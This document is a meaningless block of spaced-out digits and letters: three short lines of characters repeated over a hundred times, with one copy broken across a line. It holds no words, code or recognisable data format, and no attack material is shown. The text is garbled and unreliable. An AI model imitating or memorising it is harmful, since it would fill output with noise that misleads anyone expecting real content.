1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  8
0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
